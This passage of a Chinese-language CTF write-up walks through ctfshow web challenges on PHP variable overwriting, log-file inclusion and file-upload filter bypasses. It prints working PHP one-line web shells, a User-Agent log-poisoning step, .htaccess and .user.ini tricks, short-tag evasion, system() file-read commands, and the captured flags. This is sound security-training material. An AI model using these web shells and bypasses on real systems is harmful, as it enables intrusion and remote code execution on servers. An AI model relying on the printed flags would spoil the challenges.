<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">CTFSHOW</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$vip</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$secret</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">vip</span><span style="color:#d4d4d4"> = </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">secret</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">secret</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">isVIP</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">vip</span><span style="color:#d4d4d4">?</span><span style="color:#569cd6">TRUE</span><span style="color:#d4d4d4">:</span><span style="color:#569cd6">FALSE</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__autoload</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$class</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$class</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$class</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">#过滤字符</span></span>
<span class="line"><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_SERVER</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'QUERY_STRING'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d7ba7d">\_</span><span style="color:#d16969">| |</span><span style="color:#d7ba7d">\[</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\]</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\?</span><span style="color:#d16969">/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"error"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$ctf</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'ctf'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#dcdcaa">extract</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">class_exists</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$__CTFSHOW__</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"class is exists!"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$isVIP</span><span style="color:#d4d4d4"> &amp;&amp; </span><span style="color:#dcdcaa">strrpos</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$ctf</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">":"</span><span style="color:#d4d4d4">)===</span><span style="color:#569cd6">FALSE</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$ctf</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>~~ 一眼顶针，~~ 想到包含日志文件。ua 头写入一句话（写错只能重来）：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]);?&gt;</span></span></code></pre></div></div></figure><p>if 中还需要 isVIP 为 true，于是：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"># GET:</span></span>
<span class="line"><span style="color:#d4d4d4">?isVIP=true</span></span>
<span class="line"><span style="color:#d4d4d4">#　POST:</span></span>
<span class="line"><span style="color:#d4d4d4">ctf=/var/log/nginx/access.log&amp;1=system('ls')</span></span></code></pre></div></div></figure><h3 id="web150_plusautoload下划线绕过"><a class="markdownIt-Anchor" href="#web150_plusautoload下划线绕过"></a> web150_plus（autoload ()+ 下划线绕过）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">CTFSHOW</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$vip</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$secret</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">vip</span><span style="color:#d4d4d4"> = </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">secret</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">secret</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">isVIP</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">vip</span><span style="color:#d4d4d4">?</span><span style="color:#569cd6">TRUE</span><span style="color:#d4d4d4">:</span><span style="color:#569cd6">FALSE</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__autoload</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$class</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$class</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$class</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">#过滤字符</span></span>
<span class="line"><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_SERVER</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'QUERY_STRING'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d7ba7d">\_</span><span style="color:#d16969">| |</span><span style="color:#d7ba7d">\[</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\]</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\?</span><span style="color:#d16969">/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"error"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$ctf</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'ctf'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#dcdcaa">extract</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">class_exists</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$__CTFSHOW__</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"class is exists!"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$isVIP</span><span style="color:#d4d4d4"> &amp;&amp; </span><span style="color:#dcdcaa">strrpos</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$ctf</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">":"</span><span style="color:#d4d4d4">)===</span><span style="color:#569cd6">FALSE</span><span style="color:#d4d4d4"> &amp;&amp; </span><span style="color:#dcdcaa">strrpos</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$ctf</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"log"</span><span style="color:#d4d4d4">)===</span><span style="color:#569cd6">FALSE</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$ctf</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>相比上一题，这题要用到的是_autoload ()，因为伪协议没了，log 也没有了。</p><p>当进行类判断时就会自动调用这个 autoload，这里看上去 autoload 在 CTFSHOW 这个类里面，但其实不是的，它是个独立的方法。</p><p>而我们这个 get 传参会进行一个释放，可以做到一个类似变量覆盖的操作。但是下划线是被 ban 的，这里要想办法绕过。而这种类似的绕过前面已经碰到过了，也就是<strong>当点和空格存在于变量名时，会被自动转化为下划线</strong>。</p><p>payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?</span><span style="color:#d4d4d4">..</span><span style="color:#d4d4d4">CTFSHOW</span><span style="color:#d4d4d4">..=</span><span style="color:#d4d4d4">phpinfo</span></span></code></pre></div></div></figure><p>flag 就在环境变量里面了。</p><h2 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传"></a> 文件上传</h2><h3 id="web151无过滤常规后门"><a class="markdownIt-Anchor" href="#web151无过滤常规后门"></a> web151	(无过滤常规后门)</h3><p>启动环境。无过滤</p><p>要求上传图片，先常规写一句话无文件头试试：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222154031.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221104215445728"></p><p>发现没有文件头也能上传，直接抓包进行修改后缀试试：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222154055.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221104215748886"></p><p>访问拿 shell 咯：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222154944.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221104215937558"></p><p>flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{4ac0b860-1d4b-4bfd-8d61-d0246d9ff2a5}</span></span></code></pre></div></div></figure><h3 id="web152常规后门"><a class="markdownIt-Anchor" href="#web152常规后门"></a> web152	(常规后门)</h3><p>hint: 后端不能单一校验（文件类型校验）</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php @</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'ok'</span><span style="color:#d4d4d4">]);?&gt;</span></span></code></pre></div></div></figure><p>首次测试，没有图片文件头的一句话成功上传，访问：02.php</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222154666.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221105091126950"></p><p>找到 flag 位置读取：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222155947.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221105091215420"></p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ok=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac ../flag.php'</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{1e2d82fb-a7e5-4d40-b3b0-ab4e1ad2018f}</span></span></code></pre></div></div></figure><h3 id="web153userini利用"><a class="markdownIt-Anchor" href="#web153userini利用"></a> web153	(.user.ini 利用)</h3><p>配置文件可控</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php @</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'ok'</span><span style="color:#d4d4d4">]);?&gt;</span></span></code></pre></div></div></figure><p>无文件头的一句话此题失败，尝试写入文件头后发现还是失败。那就是后端可能进行了后缀检测了。</p><p>再次尝试 pht 这种别的后缀，上传成功，但是访问之后却发现没有正常解析，那么可能是配置文件并没有开了，但是后缀却没有过滤这些。只能另寻他法。</p><p>试试.htaccess：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;FilesMatch </span><span style="color:#ce9178">"03.png"</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"><span style="color:#dcdcaa">SetHandler</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">application/x-httpd-php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;/FilesMatch&gt;</span></span></code></pre></div></div></figure><p>结果发现这个也不行。只能试试.user.ini 了</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">auto_prepend_file=</span><span style="color:#b5cea8">1.</span><span style="color:#d4d4d4">png</span></span></code></pre></div></div></figure><p>直接访问：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">http:</span><span style="color:#6a9955">//c4543f80-5590-4aa3-90ad-6f22fe5769c2.challenge.ctf.show/upload/index.php</span></span></code></pre></div></div></figure><p>post：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ok=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'ls ../'</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>就能看到 flag，tac：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ok=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac ../flag.php'</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{4a1b0012-df08-41f5-a453-8d98b1c4af99}</span></span></code></pre></div></div></figure><h3 id="web154php标签之短标签"><a class="markdownIt-Anchor" href="#web154php标签之短标签"></a> web154	(php 标签之短标签)</h3><p>hint: 后端不能单二校验（短标签）</p><p>png 文件头 hex：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">89504E47</span></span></code></pre></div></div></figure><p>这次 php、pht 失败，并且进行了文件内容检测。经过修改文件头 hex 发现并不是没有写文件头的锅。那么可能是匹配到了写入的 php 之类的。</p><p>.user.ini：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">auto_prepend_file=</span><span style="color:#b5cea8">1.</span><span style="color:#d4d4d4">png</span></span></code></pre></div></div></figure><p>关于写入的一句话，由于这里过滤了 php（可能），那么可以使用短标签进行绕过。</p><p>对于 <strong>php 标签的其他写法</strong>这里稍微写一下：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">1.</span><span style="color:#d4d4d4">	&lt;? </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'123'</span><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"><span style="color:#6a9955">// 配置要求：short_open_tags=on</span></span></code></pre></div></div></figure><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">2.</span><span style="color:#d4d4d4">	&lt;?=(表达式)?&gt;  等价于  &lt;?php </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> (表达式)?&gt;</span></span>
<span class="line"><span style="color:#6a9955">// 无参数配置要求</span></span></code></pre></div></div></figure><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">3.</span><span style="color:#d4d4d4">	&lt;% </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'123'</span><span style="color:#d4d4d4">;%&gt;</span></span>
<span class="line"><span style="color:#6a9955">// 配置参数asp_tags=on</span></span>
<span class="line"><span style="color:#6a9955">// 经过测试发现7.0及以上修改完之后也不能使用，报500错误，但是7.0以下版本在修改完配置后就可以使用</span></span></code></pre></div></div></figure><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">4.</span><span style="color:#d4d4d4">	&lt;script language=”php”&gt;</span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'123'</span><span style="color:#d4d4d4">; &lt;/script&gt;</span></span>
<span class="line"><span style="color:#6a9955">// 没有参数设置开关要求，但是只能7.0以下使用</span></span></code></pre></div></div></figure><p>这道题我们可以使用第二种</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'cmd'</span><span style="color:#d4d4d4">])?&gt;</span></span></code></pre></div></div></figure><p>上传.user.ini：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">auto_prepend_file</span><span style="color:#d4d4d4">=</span><span style="color:#b5cea8">02</span><span style="color:#ce9178">.png</span></span></code></pre></div></div></figure><p>访问 upload/index.php 拿 shell，flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">cmd=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac ../f*'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">937</span><span style="color:#d4d4d4">da607-b6ff-</span><span style="color:#b5cea8">44</span><span style="color:#d4d4d4">a0-a1f0-</span><span style="color:#b5cea8">843822</span><span style="color:#d4d4d4">f3706b}</span></span></code></pre></div></div></figure><h3 id="web155短标签"><a class="markdownIt-Anchor" href="#web155短标签"></a> web155	(短标签)</h3><p>hint: 后端不能单三校验（短标签）</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=</span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'go'</span><span style="color:#d4d4d4">]);?&gt;</span></span></code></pre></div></div></figure><p>上传一句话之后直接用.user.ini 吧，因为难度是在上一题的基础上逐渐递增的。</p><p>.user.ini：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">auto_prepend_file</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">go.png</span></span></code></pre></div></div></figure><p>抓包修改文件名为：.user.ini 上传</p><p>上传成功之后访问 upload/index.php</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">post：go=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac ../f*'</span><span 